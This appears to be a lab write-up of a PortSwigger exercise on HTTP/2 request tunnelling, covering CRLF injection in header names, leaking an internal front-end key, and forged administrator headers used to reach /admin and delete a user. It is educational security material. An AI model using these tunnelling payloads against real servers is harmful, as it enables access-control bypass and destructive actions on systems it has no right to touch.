# HTTP/2 Request Tunnelling — GitHub Notes



## Overview



This lab is vulnerable to **HTTP/2 request tunnelling**.



The front-end server accepts HTTP/2 requests and **downgrades them to HTTP/1.1** before forwarding them to the 
back-end.



The vulnerability occurs because the front-end does not properly sanitize **HTTP/2 header names**, allowing **CRLF 
injection** and making it possible to tunnel an additional HTTP/1.1 request.



### Goal



```text

Access /admin as administrator

        ↓

Delete user carlos

        ↓

Lab solved

```



---



## Why Classic Request Smuggling Doesn't Work



The front-end **does not reuse its connection to the back-end**, so classic request smuggling techniques such as:



```text

CL.TE

TE.CL

0.CL

```



cannot be used in the usual way.



Instead, the attack relies on:



```text

HTTP/2

   ↓

Front-end

   ↓

HTTP/1.1 downgrade

   ↓

Request tunnelling
   ↓

Back-end

```



---



## Vulnerability



The front-end fails to properly sanitize HTTP/2 **header names**.



This allows CRLF characters to be injected into a header name.



During the HTTP/2 → HTTP/1.1 conversion, the injected characters can cause the header to be interpreted as 

additional HTTP/1.1 request data.



---




## Step 1 — Test CRLF Injection



A header was modified using the Burp Inspector.



The important point:



> **The CRLF payload is placed inside the header name.**



A successful test resulted in an error similar to:



```text

HTTP/2 504 Gateway Timeout




Server Error: Gateway Timeout (3) connecting to abc

```



This confirms that the injected `Host` value was processed by the server.



---



## Step 2 — Extract `X-FRONTEND-KEY`



A search request was changed to `POST` and modified using the CRLF injection.



After making the request long enough, the response revealed internal headers:



```text

X-SSL-VERIFIED: 0

X-SSL-CLIENT-CN: null


X-FRONTEND-KEY: [KEY]

```



Example:



```text

X-FRONTEND-KEY: 3172140555414838

```



### Important




The `X-FRONTEND-KEY` belongs to the **current lab instance**.



If the lab instance is restarted, a new key must be obtained.



---



## Step 3 — Change the Request Method to HEAD



The successful search request was changed to:



```http

HEAD / HTTP/2

```



`HEAD` is useful because it allows us to perform **non-blind request tunnelling** and inspect the tunneled response.



---



## Step 4 — Create the Tunnel



The malicious HTTP/2 header name contains the injected HTTP/1.1 request:



```text

foo: bar



GET /admin HTTP/1.1

X-SSL-VERIFIED: 1

X-SSL-CLIENT-CN: administrator

X-FRONTEND-KEY: [KEY]



```



The value can be:



```text

xyz

```



The newlines are inserted in Burp using **Shift + Enter**.




### Important



The CRLF injection is in the **header name**, not the value.



---



## Step 5 — Bypass the Access Control



The tunneled request contains:


```http

GET /admin HTTP/1.1

X-SSL-VERIFIED: 1

X-SSL-CLIENT-CN: administrator

X-FRONTEND-KEY: [KEY]


```



These headers make the back-end treat the request as coming from the trusted front-end and the `administrator` user.



Therefore:



```text


GET /admin

```


can return the administrator panel.



---



## Step 6 — Handle the Response Length



Initially, the response may contain an error such as:



```text

Received only 3180 of expected 3351 bytes

```



This does **not necessarily mean the tunnel failed**.



It happens because the outer `HEAD` request expects a response of a different length than the tunneled `/admin` 
response.


The solution is to use a shorter outer path, such as:



```text

/login

```



while keeping the tunneled request:



```http


GET /admin HTTP/1.1

```




unchanged.



### Two Different Requests



```text

Outer request:

HEAD /login HTTP/2

```



Inside the tunnel:



```text

GET /admin HTTP/1.1

```



The outer `:path` and the tunneled `/admin` path are separate.



---



## Step 7 — Access the Admin Panel



Once the tunnel works, the response contains the `/admin` page.



Find the delete endpoint for Carlos:



```text

/admin/delete?username=carlos

```



---



## Step 8 — Delete Carlos



Change the tunneled request from:



```http

GET /admin HTTP/1.1

```



to:



```http

GET /admin/delete?username=carlos HTTP/1.1

```



Keep the authentication headers:



```http

X-SSL-VERIFIED: 1

X-SSL-CLIENT-CN: administrator

X-FRONTEND-KEY: [KEY]

```



Send the request.



The lab is solved when `carlos` is deleted.




---



# Attack Flow



```text

HTTP/2 request

      ↓

CRLF injection in header name

      ↓

HTTP/2 → HTTP/1.1 downgrade

      ↓

HTTP/1.1 request tunnelling

      ↓

Inject internal authentication headers

      ↓

GET /admin

      ↓
Administrator access

      ↓

/admin/delete?username=carlos

      ↓

Lab solved

```



---



## Key Takeaways



* **HTTP/2 request tunnelling** is different from classic request smuggling.

* The vulnerability can occur during **HTTP/2 → HTTP/1.1 downgrading**.

* Improper sanitization of **HTTP/2 header names** can allow CRLF injection.

* CRLF can be used to create a tunneled HTTP/1.1 request.

* `X-FRONTEND-KEY` must belong to the current lab instance.

* `HEAD` can be used for **non-blind request tunnelling**.

* `Received only X of expected Y bytes` can be an expected part of the technique.

* The outer request and the tunneled request have **different paths**.


**Source:** [PortSwigger — HTTP/2 request tunnelling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling?utm_source=chatgpt.com)



**Lab:** [PortSwigger — Bypassing access controls via HTTP/2 request tunnelling](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling/lab-request-smuggling-h2-bypass-access-controls-via-request-tunnelling?utm_source=chatgpt.com)
